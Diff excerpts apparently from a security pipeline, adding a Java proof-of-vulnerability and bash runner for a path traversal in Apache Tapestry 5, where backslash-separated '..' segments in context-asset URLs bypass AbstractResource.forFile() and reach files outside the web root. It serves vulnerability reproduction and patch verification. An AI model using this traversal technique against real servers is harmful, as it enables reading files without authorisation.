+/*
+ * Proof-of-Vulnerability for CWE-022 (Path Traversal) in Apache Tapestry 5.
+ *
+ * Root cause (per the finder alert):
+ *   org.apache.tapestry5.internal.services.assets.ContextAssetRequestHandler#handleAssetRequest()
+ *   takes the attacker-controlled `extraPath` segment of a context-asset request URL and, after
+ *   stripping the leading checksum folder (ChecksumPath), hands the remainder straight to the
+ *   SHARED normalization routine org.apache.tapestry5.ioc.internal.util.AbstractResource#forFile(String).
+ *
+ *   forFile() is supposed to be the one place that neutralizes "." / ".." traversal segments
+ *   before the path reaches the filesystem (via ContextResource -> Context#getRealFile()). It
+ *   does this correctly for '/'-delimited segments (an attempt to pop above the root throws
+ *   IllegalStateException) -- but it only ever calls String#split("/"). A segment that uses a
+ *   Windows-style '\' separator is never split at all: the whole "..\..\..\x" chunk is treated
+ *   as one opaque, non-".." filename term and is appended to the resource path VERBATIM,
+ *   completely bypassing the root-boundary check. When that path later reaches a filesystem
+ *   layer that (like Windows, and like java.io.File on Windows) honors '\' as a real separator,
+ *   the embedded ".." sequences resolve as genuine parent-directory jumps and the resolved file
+ *   escapes the web application root entirely.
+ *
+ * This POV exercises the real, unmodified product classes:
+ *   - ContextAssetRequestHandler.handleAssetRequest(Request, Response, String)   [entry point]
+ *   - ChecksumPath                                                                [extraPath split]
+ *   - AbstractResource.forFile(String)                                           [the broken normalizer]
+ *   - ContextResource (extends AbstractResource) / ContextResource#toURL()
+ *
+ * Only the outermost, platform-abstraction boundary named by the alert's own trace terminus
+ * (ContextImpl -> javax.servlet.ServletContext#getRealPath) is replaced by a tiny in-process
+ * stand-in, WindowsStyleContext, that mimics the well-documented, real-world behavior of that
+ * boundary on a Windows deployment: both '/' and '\' are accepted as path separators when
+ * resolving a context-relative path to a File (this is how java.io.File itself, and
+ * ServletContext#getRealPath, behave on Windows; see the alert's own note that "Windows
+ * backslashes are security-relevant"). This is the same style of test double the project's own
+ * unit tests use for `Context` (see ContextResourceTest, which mocks Context and expects a
+ * specific getRealFile(path) argument).
+ *
+ * Exit 0  -> the handler streamed a file OUTSIDE the web application root == VULNERABLE.
+ * Exit !=0 -> the traversal was rejected/neutralized == PATCHED / not vulnerable.
+ */
+

+                    + "OUTSIDE the web application root ('" + webAppCanonical + "') by way of an "
+                    + "un-normalized '\\' segment in the request path. AbstractResource.forFile() only "
+                    + "recognizes '/' as a segment separator, so the embedded '..' traversal survives "
+                    + "into the resolved Resource path untouched.");

+            return;
+        }
+
+        System.out.println("[POV] Streamed content did not match the out-of-root secret -> NOT vulnerable.");
+        System.exit(2);
+    }

+    private static void writeFile(File f, String content) throws IOException
+    {
+        FileOutputStream out = new FileOutputStream(f);
+        try
+        {
+            out.write(content.getBytes("UTF-8"));
+        }
+        finally
+        {
+            out.close();
+        }
+    }

+    private static byte[] readAll(InputStream in) throws IOException
+    {
+        ByteArrayOutputStream bos = new ByteArrayOutputStream();
+        byte[] buf = new byte[4096];
+        int n;
+        while ((n = in.read(buf)) != -1)
+        {
+            bos.write(buf, 0, n);
+        }
+        return bos.toByteArray();
+    }

+#!/usr/bin/env bash
+# POV runner for CWE-022 path traversal in Apache Tapestry's ContextAssetRequestHandler /
+# AbstractResource.forFile() path normalization.
+#
+# Runs inside the project container, working directory /workspace/repo.
+#
+# Exit 0   -> vulnerability reproduced (unpatched code): a request path containing a
+#             Windows-style '\' traversal segment escapes the web application root.
+# Exit !=0 -> vulnerability not reproduced (patched code / traversal blocked).
+set -euo pipefail
+
+REPO="/workspace/repo"
+POV_DIR="${REPO}/.security-pipeline/pov"
+
+cd "${REPO}"
+
+# Compile just the modules the POV needs (offline; dependencies are already cached in the
+# build image). This is much faster than a full `clean build`.
+./gradlew --no-daemon --offline :tapestry-core:compileJava :tapestry-ioc:compileJava -x test -q
+
+# Collect the compiled "main" output directories for every module compileJava may have
+# touched (transitively: commons, beanmodel, plastic, tapestry5-annotations, tapestry-func,
+# tapestry-json, tapestry-ioc, tapestry-core, ...). Different modules use different build
+# output layouts in this repo (build/classes/main vs target/gradle-build/classes/main).
+CP=""
+while IFS= read -r dir; do
+  CP="${CP}${dir}:"
+done < <(find "${REPO}" -maxdepth 5 -type d \
+            \( -path '*/build/classes/main' -o -path '*/target/gradle-build/classes/main' \) 2>/dev/null)
+
+WORK="$(mktemp -d)"
+javac -cp "${CP}" -d "${WORK}" "${POV_DIR}/PathTraversalPov.java"
+
+java -cp "${CP}${WORK}" PathTraversalPov
